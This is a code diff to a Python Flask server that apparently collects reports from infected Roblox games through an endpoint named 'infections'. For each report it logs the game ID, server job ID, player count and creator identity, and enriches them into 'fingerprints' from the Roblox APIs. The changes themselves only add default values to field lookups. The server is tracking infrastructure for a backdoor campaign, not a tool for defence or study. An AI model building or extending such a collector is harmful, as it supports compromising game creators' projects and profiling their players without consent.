@@ -78,8 +78,8 @@ def getUserInfo(username: str):
             result = response.json()
             if result['data'][0]:
                 return {
-                    "displayName": result['data'][0]["displayName"],
-                    "isVerified": result['data'][0]["hasVerifiedBadge"]
+                    "displayName": result['data'][0].get("displayName"),
+                    "isVerified": result['data'][0].get("hasVerifiedBadge")
                 }
             else:
                 return {"exists": False}
@@ -136,34 +136,34 @@ def infections():
     data = request.get_json()
 
     # important stuff
-    gameid = data.get("game-id") ##
-    authorization = data.get("authorization") #
+    gameid = data.get("game-id", "?") ##
+    authorization = data.get("authorization", "?") #
 
     # server fingerprint
-    jobid = data.get("job-id") #
-    playercount = data.get("player-count") ##
+    jobid = data.get("job-id", "?") #
+    playercount = data.get("player-count", "?") ##
 
     # game fingerprint
     gamedata = getGameInfo(universeId=gameid)
 
-    name = gamedata.get("name") #
-    genre = gamedata.get("genre") #
-    visits = str(gamedata.get("visits")) ##
-    playing = str(gamedata.get("playing")) ##
-    created = gamedata.get("created") #
-    updated = gamedata.get("updated") #
-    genrel1 = gamedata.get("genre_l1") #
-    genrel2 = gamedata.get("genre_l2") # 
-    sourcename = gamedata.get("sourceName") #
-    maxplayers = str(gamedata.get("maxPlayers")) ##
-    isallgenre = str(gamedata.get("isAllGenre")) ##
-    favoritedcount = str(gamedata.get("favoritedCount")) ##
+    name = gamedata.get("name", "?") #
+    genre = gamedata.get("genre", "?") #
+    visits = str(gamedata.get("visits", "?")) ##
+    playing = str(gamedata.get("playing", "?")) ##
+    created = gamedata.get("created", "?") #
+    updated = gamedata.get("updated", "?") #
+    genrel1 = gamedata.get("genre_l1", "?") #
+    genrel2 = gamedata.get("genre_l2", "?") # 
+    sourcename = gamedata.get("sourceName", "?") #
+    maxplayers = str(gamedata.get("maxPlayers", "?")) ##
+    isallgenre = str(gamedata.get("isAllGenre", "?")) ##
+    favoritedcount = str(gamedata.get("favoritedCount", "?")) ##
 
     # creator fingerprint
-    creatoruserid = data.get("creator-userid") ##
-    creatorusername = data.get("creator-username") #
-    isVerified = str(getUserInfo(username=creatorusername).get("isVerified"))
-    displayName = getUserInfo(username=creatorusername).get("displayName")
+    creatoruserid = str(data.get("creator-userid", "?")) ##
+    creatorusername = data.get("creator-username", "?") #
+    isVerified = str(getUserInfo(username=creatorusername).get("isVerified", "?"))
+    displayName = getUserInfo(username=creatorusername).get("displayName", "?")
 
     if authorization != auth_key:
         return jsonify({"status": "forbidden"}), 404
@@ -179,7 +179,7 @@ def infections():
                     "fields": [
                         {
                             "name": "> Game Fingerprint",
-                            "value": f"> `gameId:` {str(gameid)}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {str(playing)}\n> `visits:` {str(visits)}\n> `maxPlayers:` {str(maxplayers)}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `isAllGenre:` {str(isallgenre)}\n> `favoritedCount:` {str(favoritedcount)}",
+                            "value": f"> `gameId:` {gameid}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {playing}\n> `visits:` {visits}\n> `maxPlayers:` {maxplayers}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `isAllGenre:` {isallgenre}\n> `favoritedCount:` {favoritedcount}",
                             "inline": True
                         },
                         {
